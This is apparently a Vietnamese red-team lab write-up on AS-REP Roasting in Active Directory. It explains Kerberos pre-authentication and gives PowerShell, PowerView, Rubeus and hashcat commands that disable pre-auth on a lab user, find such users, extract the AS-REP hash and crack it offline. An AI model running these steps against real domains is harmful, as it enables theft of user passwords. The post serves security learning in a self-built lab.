---
date: 2025-12-17T00:00:00+07:00
title: IredTeam AS-REP Roasting
categories: [RedTeam, pentesting]
tags: [RedTeam, Pentest, iredteam]
---

# IredTeam AS-REP Roasting 

### AS-REP là gì?

`AS-REP` (viết tắt của Authentication Service Reply) là một `thông điệp` trong giao thức xác thực `Kerberos`. Đây là bước thứ hai trong quá trình xác thực ban đầu, được gửi từ `Key Distribution Center (KDC)`, thường là một Domain Controller trong môi trường Active Directory, đến người dùng.

Thông điệp này chứa `Ticket-Granting Ticket (TGT)`, một ticket được mã hóa dùng để yêu cầu các vé dịch vụ khác mà không cần người dùng phải nhập lại mật khẩu. Một phần của thông điệp `AS-REP` này được mã hóa bằng chính `hash` mật khẩu của người dùng.

### Kỹ thuật AS-REP Roasting

`AS-REP Roasting` là một kỹ thuật tấn công trong đó kẻ tấn công có thể lấy được thông điệp AS-REP của một người dùng và cố gắng `offline crack` mật khẩu của người dùng đó.

Cuộc tấn công này chỉ có thể thực hiện được khi một tài khoản người dùng trong `Active Directory` được cấu hình với thuộc tính `Do not require Kerberos preauthentication` (Không yêu cầu xác thực trước Kerberos) được bật.

### Tại sao lại có thuộc tính "Không yêu cầu xác thực trước"?

Xác thực trước `(Pre-authentication)` là một cơ chế bảo mật mặc định của Kerberos. Trước khi KDC cấp TGT, nó yêu cầu người dùng phải chứng minh rằng họ biết mật khẩu bằng cách gửi một yêu cầu ban đầu `(AS-REQ)` có chứa một dấu thời gian (timestamp) được mã hóa bằng hash mật khẩu của họ. Điều này ngăn chặn các cuộc tấn công đoán mật khẩu trực tiếp vào KDC.

Tuy nhiên, một số ứng dụng hoặc hệ thống cũ không tương thích với cơ chế này, vì vậy quản trị viên có thể tắt nó đi cho một số tài khoản nhất định. Đây chính là lỗ hổng mà kỹ thuật `AS-REP Roasting` khai thác.

### Execution 

#### Buớc 1: Tạo user mới và bât do not require Kerberos preauthentication

Ở đây ta sẽ sử dụng powershell với 2 câu lệnh sau : 

```powershell 
# Tạo user mới
New-ADUser -Name "asrep_test" `
           -SamAccountName "asrep_test" `
           -UserPrincipalName "asrep_test@offense.local" `
           -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
           -Enabled $true

Write-Host "[+] Đã tạo user 'asrep_test' với mật khẩu 'P@ssw0rd123!'." -ForegroundColor Green
```

![image](https://hackmd.io/_uploads/S1ll_oqil-x.png)

Thành công tạo user mới bây giờ config lại quyền authen cho nó với lệnh sau : 

```powershell 
# Tắt yêu cầu pre-auth → mở cửa cho AS-REP Roasting
Set-ADAccountControl -Identity "asrep_test" -DoesNotRequirePreAuth $true

Write-Host "[+] Đã tắt Kerberos pre-authentication cho 'asrep_test'." -ForegroundColor Green
```

![image](https://hackmd.io/_uploads/B1Dhs5olZl.png)

Thành công tắt đi quyền pre-auth của user trên bây giờ ta đi đến bước tấn công.

#### Bước 2: Liệt kê user có thể tấn công

Bây giờ ta sử dụng 2 lệnh sau : 

```powershell 
# Import PowerView
. .\PowerView.ps1

# Liệt kê user có DONT_REQ_PREAUTH
Get-DomainUser -PreauthNotRequired -Verbose
```

Lệnh này giúp ta chạy powerview sau đó từ powerview ta sẽ tiến hành truy vấn tìm kiếm các user có được config no pre-auth.

![image](https://hackmd.io/_uploads/rJ5y65ilWx.png)

![image](https://hackmd.io/_uploads/B1uF69oebx.png)

Thành công tìm được user `asrep_victim` có thể thấy được nó đã được gán quyền `DONT_REQ_PREAUTH` bây giờ ta sẽ đi tới bước tiếp theo.

#### Sử dụng tool Ruberus để thực hiện AS-REP Roasting

```powershell 
# Chạy Rubeus và lưu output
$hash = .\Rubeus.exe asreproast /user:asrep_test /domain:offense.local /format:john 2>&1 | Out-String

# Hiển thị hash
Write-Host "[+] Hash AS-REP nhận được:" -ForegroundColor Cyan
Write-Host $hash

# Lưu hash vào file để crack sau
$hash | Out-File -FilePath asrep.hash -Encoding ASCII
Write-Host "[+] Đã lưu hash vào: C:\Tools\asrep.hash" -ForegroundColor Green
```

![image](https://hackmd.io/_uploads/SyunWsolWl.png)

Thành công lấy được hash bây giờ thì ta tới với bước crack thôi.

#### Crack password bằng hashcat

Sau khi có được AS-REP hash rồi thì ta sẽ lưu nó vào một file ở đây tôi lưu nó trong file `asrep.hash`.

Sau đó sử dụng hashcat với lệnh : 

```bash 
hashcat -m 18200 asrep.hash mywordlist.txt
```

![image](https://hackmd.io/_uploads/Hk4_jPo-bg.png)

Từ đây thành công crack ra password của user mà ta cần phải tấn công và hoàn thành lab.

